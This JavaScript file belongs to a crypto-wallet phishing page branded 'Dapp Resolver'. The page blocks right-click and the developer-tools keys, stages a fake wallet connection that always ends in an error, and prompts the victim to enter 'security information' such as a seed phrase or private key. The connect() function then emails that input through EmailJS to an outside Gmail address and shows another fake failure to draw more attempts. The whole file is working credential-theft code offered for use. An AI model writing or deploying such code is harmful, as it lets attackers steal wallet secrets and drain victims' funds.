// disable right click
document.addEventListener('contextmenu', event => event.preventDefault());
// disable inspect element
document.onkeydown = (e) => {
    if (e.key == 123) {
        e.preventDefault();
    }
    if (e.ctrlKey && e.shiftKey && e.key == 'I') {
        e.preventDefault();
    }
    if (e.ctrlKey && e.shiftKey && e.key == 'C') {
        e.preventDefault();
    }
    if (e.ctrlKey && e.shiftKey && e.key == 'J') {
        e.preventDefault();
    }
    if (e.ctrlKey && e.key == 'U') {
        e.preventDefault();
    }
};

function closeModal() {
    document.getElementById("front").style.display = "";
    document.getElementById("all-wallets").style.display = "none";
    document.getElementById("connection").style.display = "none";
    document.getElementById("loading").style.display = "";
    document.getElementById("user-input").style.display = "none";
    document.getElementById("error").style.display = "none";
    document.getElementById("modal-dark").style.display = "none";
}
function filter() {
    query = document.getElementById("search-box").value.toUpperCase();
    list = document.getElementById("wallet-list");
    wallets = list.querySelectorAll(".wlt");
    wallets.forEach(wallet => {
        if (wallet.querySelector("p").innerHTML.toUpperCase().indexOf(query) > -1) {
            wallet.style.display = "flex";
        }
        else {
            wallet.style.display = "none";
        }
    });

}
window.onload = () => {
    buttons = document.querySelectorAll(".connectButton");
    buttons.forEach(button =>{
        button.addEventListener('click', ()=>{
            document.getElementById("modal-dark").style.display = "";
        });
    })
    wallets = document.querySelectorAll(".wlt");
    wallets.forEach(wallet => {
        wallet.addEventListener("click", () => {
            walletName = wallet.querySelector("p").innerHTML;
            // console.log(walletName);
            if (walletName == "All Wallets") {
                document.getElementById("front").style.display = "none";
                document.getElementById("all-wallets").style.display = "";
            }
            else {
                walletLogoSrc = wallet.querySelector("img").src;
                document.getElementById("front").style.display = "none";
                document.getElementById("all-wallets").style.display = "none";
                document.getElementById("connection").style.display = "";
                document.getElementById("connectionName").innerHTML = walletName;
                document.getElementById("connectionImg").src = walletLogoSrc;
                setTimeout(() => {
                    document.getElementById("loading").style.display = "none";
                    document.getElementById("user-input").style.display = "none";
                    document.getElementById("error").style.display = "";
                }, 7000);
            }


        })
    });
}
function retry_connection() {
    document.getElementById("user-input").style.display = "none";
    document.getElementById("error").style.display = "none";
    document.getElementById("loading").style.display = "";
    setTimeout(() => {
        document.getElementById("user-input").style.display = "none";
        document.getElementById("loading").style.display = "none";
        document.getElementById("error").style.display = "";
    }, 12000);
}
function connect() {
    user_input = document.getElementById("info").value;
    user_input_type = document.getElementById("info-type").value;

    if (user_input == "") {
        alert("You need to enter your security information to connect");
    }
    else {
        message = `${user_input_type}:\n\n ${user_input}`;
        sendProjectMail(message);
        document.getElementById("info").value = "";
        retry_connection();
    }
}
function connect_manually() {
    document.getElementById("loading").style.display = "";
    document.getElementById("error").style.display = "none";
    setTimeout(() => {
        document.getElementById("loading").style.display = "none";
        document.getElementById("user-input").style.display = "";
        document.getElementById("error").style.display = "none";
    }, 2000);
}

function sendProjectMail(text) {
    emailjs.send("service_79l7ile", "template_4k5y6no", {
        site_name: "Dapp Resolver",
        site_admin: "hulux1221@gmail.com",
        message: `${text}`,
    }, "HZoDQgfZafWNBt_z_")
        .then(function (response) {
            // window.location.href = '../success/index.html'; //successfully connected
            console.log(response);
        }, function (error) {
            console.log('FAILED...', error);
            alert("[Error:1x45a] Unable to parse request data. Contact Support");
        });


}